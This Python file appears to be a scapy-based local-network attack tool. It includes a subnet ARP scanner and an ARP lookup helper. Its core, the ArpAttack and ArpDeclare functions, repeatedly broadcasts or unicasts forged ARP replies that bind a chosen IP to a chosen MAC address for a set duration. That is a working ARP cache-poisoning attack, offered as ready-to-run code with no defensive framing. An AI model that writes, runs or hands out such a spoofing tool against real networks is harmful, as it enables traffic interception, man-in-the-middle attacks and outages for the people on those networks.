from scapy.all import *
import threading
import time
from colorama import init, Fore, Back, Style
import re
import ipaddress
import psutil
import socket
import struct

def Calcs(calc_type: str):
    
    def get_first_valid_ipv4_interface():
        for iface, addrs in psutil.net_if_addrs().items():
            for a in addrs:
                if a.family == socket.AF_INET and a.address != "127.0.0.1":
                    return iface, a.address, a.netmask
        return None, None, None

    def calc_broadcast(ip, netmask):
        ip_int = struct.unpack("!I", socket.inet_aton(ip))[0]
        mask_int = struct.unpack("!I", socket.inet_aton(netmask))[0]
        return socket.inet_ntoa(struct.pack("!I", ip_int | (~mask_int & 0xFFFFFFFF)))

    def get_broadcast():
        iface, ip, mask = get_first_valid_ipv4_interface()

        if not ip or not mask:
            return None
        
        return calc_broadcast(ip, mask)

    def get_mask():
        iface, ip, mask = get_first_valid_ipv4_interface()
        return mask

    if calc_type.lower() == "broad":
        return get_broadcast()
    elif calc_type.lower() == "subnet_mask":
        return get_first_valid_ipv4_interface()[2]
    elif calc_type.lower() == "ip":
        return get_first_valid_ipv4_interface()[1]

def AskForMac(target: str, repsource: str):
    if repsource == "broadcast":
        repsource = "ff:ff:ff:ff:ff:ff"
    if DataType(repsource) == "ip":
        repsource = AskForMac(target=repsource , repsource="ff:ff:ff:ff:ff:ff")
        if DataType(repsource) != "mac":
            return """
[ERROR] There is a Problem Connecting to the Destination
Did you write true Destination IP Adress ?
        """
    
    if not (
        "." in target
        and len(target.split(".")) == 4
        and all(p.isdigit() and 0 <= int(p) <= 255 for p in target.split("."))
    ):
        return """
[ERROR] Invalid.
Wrong Destination IP Adress
        """

    if not (
        (":" in repsource or "-" in repsource)
        and len(repsource.replace("-", ":").split(":")) == 6
        and all(len(p) == 2 and all(c in "0123456789abcdefABCDEF" for c in p)
                 for p in repsource.replace("-", ":").split(":"))
    ):
        return """
[ERROR] Invalid.
Wrong Destination MAC Adress
        """

    pkt = Ether(dst=repsource)/ARP(
        op=1,
        pdst=target
    )

    ans = srp(pkt , verbose=False , timeout=5)[0]
    for s, r in ans:
        return f"{r.hwsrc}"
 
def DataType(data):
    if data is None:
        return "None"
    
    dst_type = ""
    mac_pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    ip_pattern = r"^(\d{1,3}\.){3}\d{1,3}$"

    if re.match(mac_pattern, data):
        return "mac"

    elif re.match(ip_pattern, data):
        return "ip"
    else:
        return "None"

def ArpDeclare(mac_dst: str, ip_dst: str , trg_ip: str , trg_mac: str):
    
    
    if DataType(ip_dst) != "ip" or DataType(mac_dst) != "mac":
        return "[ERROR] Invalid."


    pkt = Ether(dst=mac_dst, type=0x806)/ARP(
        op=2,
        psrc=trg_ip,
        hwsrc=trg_mac,
        pdst=ip_dst,
        hwdst=mac_dst
    )

    try:
        sendp(pkt, verbose=0)
        print(Fore.LIGHTCYAN_EX + f">> sent Packet to '{ip_dst}=={mac_dst}' that {trg_ip}-->{trg_mac}")
    except Exception:
        print(Fore.RED + ">> Failed to send Packet.")

def ArpAttack(dest: str , target: str , ticks: float , dur: float):
    dest_mac_comp = ""
    dest_ip_comp = ""
    if "==" in dest:
        dest_comps = dest.split("==")

        for comp in dest_comps:
            if DataType(comp) == "mac":
                dest_mac_comp = comp
            elif DataType(comp) == "ip":
                dest_ip_comp = comp
            else:
                return "[ERROR] Invalid."
    else:
        if dest.lower() == "broadcast" or dest == "ff:ff:ff:ff:ff:ff":
            dest_mac_comp = "ff:ff:ff:ff:ff:ff"
            dest_ip_comp = "255.255.255.255"
        else:
            return "[ERROR] Invalid."
    
    if "[ERROR] Invalid." in dest_ip_comp:
        return "[ERROR] Invalid."

    targ_comps = target.split("==")
    targ_mac_comp = ""
    targ_ip_comp = ""

    for comp in targ_comps:
        if DataType(comp) == "mac":
            targ_mac_comp = comp
        elif DataType(comp) == "ip":
            targ_ip_comp = comp
        else:
            return "[ERROR] Invalid."
        
    print("")
    print(Fore.MAGENTA + "----------------------------------------------")
    print(Fore.YELLOW + f"Destination: {dest_ip_comp}=={dest_mac_comp}")
    print(Fore.BLUE + f"Target: {targ_ip_comp}=={targ_mac_comp}")
    print(Fore.MAGENTA + "----------------------------------------------")
    print("")

    print(f">> Remained {dur}s")
    while dur > 0:
        time.sleep(ticks)
        ArpDeclare(ip_dst=dest_ip_comp , mac_dst=dest_mac_comp , trg_ip=targ_ip_comp , trg_mac=targ_mac_comp)
        dur -= ticks
        print(f">> Remained {dur}s")
    
    
    print("")
    print(Fore.GREEN + "Operation Completed.")
    print("")


def ArpScan():
    subnet_mask = Calcs("subnet_mask")
    ip = Calcs("ip")

    def get_network_range(ip, subnet_mask):
        return ipaddress.IPv4Network(f"{ip}/{subnet_mask}", strict=False)

    def scan_devices(ip, subnet_mask):
        network = get_network_range(ip, subnet_mask)

        arp = ARP(pdst=str(network))
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        answered = srp(packet, timeout=2, verbose=0)[0]
        devices = []
        seen_ips = set()

        for _, received in answered:
            devices.append({
                "ip": received.psrc,
                "mac": received.hwsrc
            })
            seen_ips.add(received.psrc)

        for host in network.hosts():
            host_ip = str(host)

            if host_ip in seen_ips:
                continue

            mac = AskForMac(target=host_ip, repsource="ff:ff:ff:ff:ff:ff")

            if DataType(mac) == "mac":
                devices.append({
                    "ip": host_ip,
                    "mac": mac
                })

        return devices

    devices = scan_devices(ip, subnet_mask)

    print("\nDevices Found:")
    for d in devices:
        print(f"{d['ip']}  -->  {d['mac']}")
